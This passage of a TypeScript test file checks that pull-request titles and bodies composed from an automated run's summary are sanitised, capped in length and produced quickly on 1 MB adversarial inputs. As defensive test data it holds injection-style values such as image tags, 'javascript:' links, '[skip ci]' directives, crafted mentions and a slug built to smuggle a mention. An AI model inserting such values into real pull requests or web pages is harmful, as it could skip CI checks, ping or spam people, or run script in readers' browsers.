		expect(composeRunPullRequestTitle({ summary: 'x\nPR-TITLE: Add a saved-search digest', slug: 'T-9' })).toBe(
			'feat: add a saved-search digest [T-9]'
		);
	});

	it('keeps the type and scope the run wrote', () => {
		for (const [line, expected] of [
			['PR-TITLE: docs(api): describe leases', 'docs(api): describe leases [T-1]'],
			['PR-TITLE: refactor: split the planner', 'refactor: split the planner [T-1]'],
			['PR-TITLE: test: cover the zero case', 'test: cover the zero case [T-1]'],
			['PR-TITLE: chore: bump vitest', 'chore: bump vitest [T-1]'],
			['**PR-TITLE: fix: handle an empty list**', 'fix: handle an empty list [T-1]']
		] as const) {
			expect(composeRunPullRequestTitle({ summary: `Done.\n${line}`, slug: 'T-1' }), line).toBe(expected);
		}
	});

	it('answers null when the run named no title, so the caller keeps its own', () => {
		for (const summary of [null, undefined, '', 'Fixed it.', 'PR-TITLE: early\nthen more text']) {
			expect(composeRunPullRequestTitle({ summary, slug: 'T-1' })).toBeNull();
		}
	});

	it('leaves out a slug that is not a plain token, and never lets the title act', () => {
		expect(composeRunPullRequestTitle({ summary: 'x\nPR-TITLE: Fix it', slug: 'T-1] @octocat [x' })).toBe(
			'fix: it'
		);
		expect(composeRunPullRequestTitle({ summary: 'x\nPR-TITLE: Fix it', slug: null })).toBe('fix: it');
		const hostile = composeRunPullRequestTitle({
			summary: 'x\nPR-TITLE: Fixes #12 for @octocat <img src=x> [skip ci] https://github.com/a/b/issues/3',
			slug: 'T-7'
		})!;
		expect(hostile).not.toMatch(/@\w|#\d|<img|\[skip ci\]|https?:\/\//i);
		expect(containsCiSkipDirective(hostile)).toBe(false);
		expect(hostile.endsWith(' [T-7]')).toBe(true);
		expect(hostile).not.toMatch(/[\r\n]/);
	});

	it('keeps the summary part within the subject length', () => {
		const title = composeRunPullRequestTitle({
			summary: `x\nPR-TITLE: ${'Rework the salary range filter and its saved search digest '.repeat(3)}`,
			slug: 'T-2286'
		})!;
		expect(Array.from(title.replace(/ \[T-2286\]$/, '')).length).toBeLessThanOrEqual(72);
	});
});

describe('bounded on adversarial input', () => {
	const MB = 1024 * 1024;
	const fill = (unit: string): string => unit.repeat(Math.ceil(MB / unit.length)).slice(0, MB);
	const ladder = (): string => {
		// Backtick runs of every length 1, 2, 3 … — each one an opener with no
		// closer of its own length: the worst case of the inline-code scan.
		let out = '';
		for (let run = 1; out.length < MB; run += 1) out += `${'`'.repeat(run)}a`;
		return out.slice(0, MB);
	};
	const HOSTILE: Array<[string, () => string]> = [
		['one 1 MB line', () => fill('a')],
		['image tags', () => fill('<img src=x ')],
		['unclosed image links', () => fill('![a](')],
		['one backtick run', () => fill('`')],
		['a ladder of backtick runs', ladder],
		['unclosed comments', () => fill('<!--')],
		['mentions and references', () => fill('@octocat #1 ')],
		['script links', () => fill('[x](javascript:')],
		['backslashes before a span', () => `${fill('\\').slice(0, MB - 10)}\`@octocat\``],
		['table cells and backticks', () => fill('| ` ')],
		['character references', () => fill('&#64;')],
		['emphasis openers', () => fill('**a')],
		['zero-width characters inside mentions', () => fill('@​‍octo')],
		['fence lines', () => fill('```\n')],
		['short lines', () => fill('x\n')],
		['closing keywords and issue URLs', () => fill('fixes https://github.com/a/b/issues/1 ')],
		['marker lines', () => fill('PR-TITLE: Fix it\n')],
		['whitespace before a title', () => `${fill(' ')}\nPR-TITLE: Fix the redirect`],
		['a long body before a title', () => `${fill('word ')}\nPR-TITLE: Fix the redirect`],
		['nested backticks and tildes', () => fill('~~~`` `~~~\n')]
	];

	/** Best of three, so a garbage-collection pause on a shared machine is not read as a quadratic pattern. */
	function fastest(run: () => unknown): number {
		let best = Number.POSITIVE_INFINITY;
		for (let attempt = 0; attempt < 3; attempt += 1) {
			const started = performance.now();
			run();
			best = Math.min(best, performance.now() - started);
		}
		return best;
	}

	it.each(HOSTILE)('sanitizes 1 MB of %s in under 50 ms, inert and capped', (_what, build) => {
		const input = build();
		expect(input.length).toBeGreaterThanOrEqual(MB);
		let output = '';
		const elapsed = fastest(() => {
			output = sanitizeRunPullRequestBody(input);
		});
		expect(elapsed).toBeLessThan(50);
		expect(Array.from(output).length).toBeLessThanOrEqual(RUN_PULL_REQUEST_BODY_MAX_LENGTH);
		expectInert(output);
	});

	it.each(HOSTILE)('reads the title and the one-line summary of 1 MB of %s in under 50 ms', (_what, build) => {
		const input = build();
		const elapsed = fastest(() => {
			parseRunPullRequestTitle(input);
			composeRunPullRequestTitle({ summary: input, slug: 'T-1' });
			summarizeRunChangeInOneLine(input);
			sanitizeRunPullRequestTitle(input);
			applyRunPullRequestTitleToCommitMessage('feat: x\n\nTask: T-1', input);
		});
		expect(elapsed).toBeLessThan(50);
	});

	it('still finds a title at the end of a 1 MB summary', () => {
		expect(parseRunPullRequestTitle(`${fill('word ')}\nPR-TITLE: Fix the redirect`).title).toBe('Fix the redirect');
		expect(composeRunPullRequestTitle({ summary: `${fill(' ')}\nPR-TITLE: Fix the redirect`, slug: 'T-1' })).toBe(
			'fix: the redirect [T-1]'
		);
	});
});
